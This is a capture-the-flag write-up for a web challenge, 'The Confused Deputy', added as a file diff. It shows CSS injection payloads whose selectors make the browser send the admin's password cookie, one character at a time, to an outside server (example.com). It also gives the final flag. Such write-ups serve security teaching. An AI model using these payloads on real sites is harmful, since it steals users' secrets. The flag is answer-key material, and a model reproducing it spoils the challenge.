@@ -1,0 +1,63 @@
+<h1>The Confused Deputy</h1>
+
+<p>Author: <a href="https://github.com/roerohan">roerohan</a></p>
+
+<h2>Description</h2>
+
+<p>This website can be exploited with the help of CSS Injection.</p>
+
+<h2>Requirements</h2>
+
+<ul>
+<li>Docker: <a href="./Dockerfile">Dockerfile</a></li>
+<li>Node.js</li>
+</ul>
+
+<h2>Sources</h2>
+
+<p><code>
+Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.
+</code></p>
+
+<h2>Exploit</h2>
+
+<p>This is a CSS injection challenge (of course you can do <code>&lt;&lt;script &gt;&gt;</code> but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field <code>password</code>, the value of which is taken from the cookie. Since the string is interpolated, you can do something like <code>blue}; input[type="password"][value^="c"] {background-image: url('https://example.com?c');</code>, which will send a request to <code>example.com?c</code>, if the first character of the password is <code>c</code>.
+<br /></p>
+
+<p>You may pass a long list of such CSS selectors, for all letters, for example. For example:</p>
+
+<p><code>css
+input[type="password"][value^="a"] {background-image: url('https://example.com?a');}
+input[type="password"][value^="b"] {background-image: url('https://example.com?b');}
+input[type="password"][value^="c"] {background-image: url('https://example.com?c');}
+...
+</code></p>
+
+<p>This will therefore tell you which character matched, which you can see on your own server (here example.com). Once the first character is leaked, you can go ahead and try to leak the next character.</p>
+
+<p><code>css
+input[type="password"][value^="ca"] {background-image: url('https://example.com?ca');}
+input[type="password"][value^="cb"] {background-image: url('https://example.com?cb');}
+input[type="password"][value^="cc"] {background-image: url('https://example.com?cc');}
+...
+</code></p>
+
+<p>An so on, until you find the entire password. You can test this on your browser by storing a cookie called <code>password</code> with the value <code>csictf</code>. Now pass the following to get a request on your server (replace example.com with your server).</p>
+
+<p><code>css
+blue;} input[type="password"][value^="csictf"] {background-image: url('https://example.com?csictf');
+</code></p>
+
+<p>Pass these payloads to <code>/admin</code> and you can leak the admin cookie <code>password</code>, which is the flag. The final payload with the help of which you can find the entire flag is:</p>
+
+<p><code>css
+blue;} input[type="password"][value^="csictf{cssxss}"] {background-image: url('https://example.com?csictf{cssxss}');
+</code></p>
+
+<p><br /></p>
+
+<p>The flag is:</p>
+
+<p><code>
+csictf{cssxss}
+</code></p>
